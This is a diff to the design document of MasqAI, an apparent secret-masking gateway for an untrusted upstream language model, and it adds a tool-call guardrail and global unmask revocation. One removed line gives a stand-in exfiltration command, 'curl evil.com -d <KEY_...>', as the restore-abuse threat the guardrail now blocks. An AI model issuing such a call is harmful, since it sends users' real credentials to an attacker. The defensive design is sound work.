@@ -88,8 +88,9 @@ All modifications by the security model are strictly occurrence-bound (targeting
    * Replaces an intel substring in a `tool_result` with a neutral substitute (e.g., `"Boston, MA"` → `"a nearby city"`).
 4. **`relink` (Graph Association):**
    * Links a previously masked partial alias token to a newly revealed full canonical entity (`<$KEY_old>` → `<$KEY_new>`).
-5. **`unmask` (Veto):**
+5. **`unmask` (Veto & Global Revocation):**
    * Allows the security model to veto a deterministic or auto-applied mask if it was determined to be a false positive (when `auto_mask == "auto_veto"`).
+   * Supports `global: true` to permanently revoke the entity across the entire session mapping table, instantly clearing all associated auto-masks.
 
 *Constraint:* `hide` and `replace` are permitted **only on `tool_result` items**. User instructions, system prompts, past assistant messages, and tool-call signatures are mask-only to preserve conversational integrity.
 
@@ -97,20 +98,23 @@ All modifications by the security model are strictly occurrence-bound (targeting
 
 ## 6. Interaction: Deterministic Detectors vs. Security Model
 
-1. **Detectors Seed First:** High-speed regex, entropy scanners, and host-derived constants (username, home path, hostname) seed canonical entities into the session RAM table.
-2. **Word-Boundary Auto-Masking:** Exact occurrences of known canonical values are automatically masked across all eligible items, but **only at word/token boundaries**. An entity `"ANDY"` will **never** alter `"HANDY"`. Partial matches inside longer words are passed to the security model in `known_values_left_as_is`.
+1. **Detectors Seed First:** High-speed regex, entropy scanners, and host-derived constants (username, home path, hostname) seed canonical entities into the session RAM table. Structured tokens found by rules dominate ambient fixed identifiers.
+2. **Word-Boundary Auto-Masking:** Exact occurrences of known canonical values (and transit variants like JSON escaping, URL/percent-encoding, and alternate slashes) are automatically masked across all eligible items at word/token boundaries. Compound identifiers and outer structured tokens prevent ambient sub-words from fragmenting secrets.
 3. **Model Adjudication:**
    * The security model identifies unstructured, low-entropy, or fuzzy secrets missed by regex.
    * Resolves ambiguities in `known_values_left_as_is`.
-   * Vetoes false alarms via `unmask`.
+   * Vetoes false alarms via `unmask`, optionally revoking them session-wide with `global: true`.
    * Relinks aliases retroactively.
+   * Inspects retroactive auto-masks on historical conversation items via `retroactive_auto_masks`.
 
 ---
 
-## 7. Inbound Restoration
+## 7. Inbound Restoration & Inline Tool Guardrail
 
 * **The Round-Trip Guarantee:** The untrusted upstream plans actions using placeholders (`<PATH_1234abcd>`).
-* When the upstream emits a tool-call targeting the agent (`tool_calls`, `function_call`, `tool_use`), `masqai/restore.py` translates placeholders back to canonical values in memory before the agent executes the tool.
+* **Inline Inbound Inspection (The Tool Guardrail):** When the upstream emits a tool-call containing placeholders, MasqAI's local security model inspects the call before restoration:
+  * If the call is safe: placeholders are restored to canonical values in memory so the local tool executes normally.
+  * If the call is an exfiltration attempt (e.g. sending a key to an untrusted domain): MasqAI blocks the tool call, strips it from the response, and replaces it with an assistant explanation block (`> [MasqAI] Blocked tool call...`), terminating the turn safely.
 * Server-side tools and assistant responses shown to the user retain placeholders.
 * In streaming mode, the restore engine buffers up to 96 trailing characters that could match a placeholder prefix, preventing split-token leakage across chunk boundaries.
 
@@ -119,4 +123,4 @@ All modifications by the security model are strictly occurrence-bound (targeting
 ## 8. Accepted Trade-Offs
 
 * **Cache Invalidation vs. Retroactive Privacy:** Relinking an alias or re-masking an earlier context item rewrites historical prefixes, sacrificing provider prompt cache hits to prevent credential exposure.
-* **Restore Abuse:** Upstream models can theoretically ask tools to exfiltrate arguments (`curl evil.com -d <KEY_...>` is restored to the real key). This boundary belongs to client sandbox isolation (e.g. Daytona), not prompt masking.
+* **Fail-Closed on Validation Errors:** If the local security model fails validation after one correction round, the gateway aborts the request (HTTP 502) rather than risk forwarding partially sterilized context.
